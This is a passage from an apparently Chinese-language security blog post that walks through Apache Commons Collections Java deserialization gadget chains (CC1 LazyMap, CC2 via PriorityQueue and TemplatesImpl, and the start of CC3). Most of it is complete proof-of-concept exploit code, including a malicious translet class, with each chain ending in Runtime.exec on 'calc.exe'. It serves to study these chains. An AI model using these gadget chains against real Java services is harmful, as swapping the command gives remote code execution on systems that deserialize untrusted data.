    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token class-name">CC_LazyMap</span><span class="token punctuation">(</span><span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">/*
            Gadget chain:
                ObjectInputStream.readObject()
                    AnnotationInvocationHandler.readObject()
                        Map(Proxy).entrySet()
                            AnnotationInvocationHandler.invoke()
                                LazyMap.get()
                                    ChainedTransformer.transform()
                                        ConstantTransformer.transform()
                                        InvokerTransformer.transform()
                                            Method.invoke()
                                                Class.getMethod()
                                        InvokerTransformer.transform()
                                            Method.invoke()
                                                Runtime.getRuntime()
                                        InvokerTransformer.transform()
                                            Method.invoke()
                                                Runtime.exec()

            Requires:
                commons-collections
         */</span>
        <span class="token class-name">Transformer</span> transformerChain <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Map</span> innerMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Map</span> outerMap <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>innerMap<span class="token punctuation">,</span> transformerChain<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">Class</span> clazz <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"sun.reflect.annotation.AnnotationInvocationHandler"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Constructor</span> construct <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Map</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        construct<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">InvocationHandler</span> handler <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">InvocationHandler</span><span class="token punctuation">)</span> construct<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token class-name">Retention</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> outerMap<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// AnnotationInvocationHandler实际上就是一个InvocationHandler</span>
        <span class="token comment">// 我们如果将这个对象用Proxy进行代理，那么在readObject的时候，只要调用任意方法，就会进入到 AnnotationInvocationHandler#invoke 方法中</span>
        <span class="token comment">// 进而触发我们的LazyMap#get,随后的利用链就和TransformedMap的一样了</span>
        <span class="token class-name">Map</span> proxyMap <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Map</span><span class="token punctuation">)</span> <span class="token class-name">Proxy</span><span class="token punctuation">.</span><span class="token function">newProxyInstance</span><span class="token punctuation">(</span><span class="token class-name">Map</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span><span class="token class-name">Map</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> handler<span class="token punctuation">)</span><span class="token punctuation">;</span>
        handler <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">InvocationHandler</span><span class="token punctuation">)</span> construct<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token class-name">Retention</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> proxyMap<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token function">out</span><span class="token punctuation">(</span>handler<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">out</span><span class="token punctuation">(</span><span class="token class-name">InvocationHandler</span> handler<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">ByteArrayOutputStream</span> barr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ObjectOutputStream</span> oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>barr<span class="token punctuation">)</span><span class="token punctuation">;</span>
        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>handler<span class="token punctuation">)</span><span class="token punctuation">;</span>
        oos<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>barr<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ObjectInputStream</span> ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>barr<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Object</span> o <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">)</span>ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>注意代码注释，<code>TransformedMap</code>这条链在<code>Java8</code>后无法使用，因为反序列化所用到的<code>AnnotationInvocationHandler</code>被改写，<code>LazyMap</code>为改写后的利用方法</p>
<h3 id="CommonCollections2"><a href="#CommonCollections2" class="headerlink" title="CommonCollections2"></a>CommonCollections2</h3><p>主要使用<code>PriorityQueue</code>来触发<code>TransformingComparator.compare</code>方法，然后触发<code>ChainedTransformer.transform</code>方法</p>
<p>然而后面有不依靠<code>ChainedTransformer</code>的新利用方法，主要是通过<code>TemplatesImpl</code>来动态加载字节码文件，然后需要<code>newTransformer</code>才能加载恶意类，就利用<code>InvokerTransformer</code>的<code>transform</code>反射触发</p>
<pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TemplatesImpl</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TransformerFactoryImpl</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>comparators<span class="token punctuation">.</span></span><span class="token class-name">TransformingComparator</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ChainedTransformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>ibatis<span class="token punctuation">.</span>javassist<span class="token punctuation">.</span></span><span class="token class-name">ClassPool</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>ibatis<span class="token punctuation">.</span>javassist<span class="token punctuation">.</span></span><span class="token class-name">CtClass</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Comparator</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">PriorityQueue</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token keyword">static</span> <span class="token import static"><span class="token namespace">com<span class="token punctuation">.</span>loader<span class="token punctuation">.</span></span><span class="token class-name">Reflections</span><span class="token punctuation">.</span><span class="token static">setFieldValue</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CommonCollections2</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">CC_PriorityQueue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token class-name">CC_PriorityQueue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> fakeTransformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>
                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span> <span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"calc.exe"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

        <span class="token class-name">Transformer</span> transformerChain <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>fakeTransformers<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">TransformingComparator</span> comparator <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TransformingComparator</span><span class="token punctuation">(</span>transformerChain<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">PriorityQueue</span> queue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PriorityQueue</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> comparator<span class="token punctuation">)</span><span class="token punctuation">;</span>

        queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>transformerChain<span class="token punctuation">,</span> <span class="token string">"iTransformers"</span><span class="token punctuation">,</span> transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">ByteArrayOutputStream</span> barr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ObjectOutputStream</span> oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>barr<span class="token punctuation">)</span><span class="token punctuation">;</span>
        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>queue<span class="token punctuation">)</span><span class="token punctuation">;</span>
        oos<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>barr<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ObjectInputStream</span> ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>barr<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Object</span> o <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">)</span>ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token class-name">CC_No_Transformer</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">ClassPool</span> pool <span class="token operator">=</span> <span class="token class-name">ClassPool</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">CtClass</span> clazz <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>loader<span class="token punctuation">.</span></span>HelloTemplatesImpl</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">TemplatesImpl</span> obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"_bytecodes"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>clazz<span class="token punctuation">.</span><span class="token function">toBytecode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"_name"</span><span class="token punctuation">,</span> <span class="token string">"HelloTemplatesImpl"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"_tfactory"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">Transformer</span> transformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"toString"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Comparator</span> comparator <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TransformingComparator</span><span class="token punctuation">(</span>transformer<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">PriorityQueue</span> queue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PriorityQueue</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> comparator<span class="token punctuation">)</span><span class="token punctuation">;</span>

        queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>
        queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>transformer<span class="token punctuation">,</span> <span class="token string">"iMethodName"</span><span class="token punctuation">,</span> <span class="token string">"newTransformer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">ByteArrayOutputStream</span> barr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ObjectOutputStream</span> oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>barr<span class="token punctuation">)</span><span class="token punctuation">;</span>
        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>queue<span class="token punctuation">)</span><span class="token punctuation">;</span>
        oos<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>barr<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ObjectInputStream</span> ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>barr<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Object</span> o <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">)</span>ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p><code>HelloTemplatesImpl.java</code>代码，这里恶意必须继承<code>AbstractTranslet</code>，因为反序列化的时候<code>defineTransletClasses</code>函数会判断字节码转化的类是否继承自<code>AbstractTranslet</code></p>
<pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>loader</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span></span><span class="token class-name">DOM</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span></span><span class="token class-name">TransletException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span></span><span class="token class-name">AbstractTranslet</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>dtm<span class="token punctuation">.</span></span><span class="token class-name">DTMAxisIterator</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>serializer<span class="token punctuation">.</span></span><span class="token class-name">SerializationHandler</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HelloTemplatesImpl</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractTranslet</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">DOM</span> document<span class="token punctuation">,</span> <span class="token class-name">SerializationHandler</span><span class="token punctuation">[</span><span class="token punctuation">]</span> handlers<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TransletException</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">DOM</span> document<span class="token punctuation">,</span> <span class="token class-name">DTMAxisIterator</span> iterator<span class="token punctuation">,</span> <span class="token class-name">SerializationHandler</span> handler<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TransletException</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token class-name">HelloTemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc.exe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Hello TemplatesImpl"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h3 id="CommonCollections3"><a href="#CommonCollections3" class="headerlink" title="CommonCollections3"></a>CommonCollections3</h3><p>这条链主要利用的是<code>TiedMapEntry</code>这个<code>Map</code>类，外加<code>TemplatesImpl</code>动态加载字节码</p>
<pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TemplatesImpl</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TrAXFilter</span></span><span class="token punctuation">;</span>
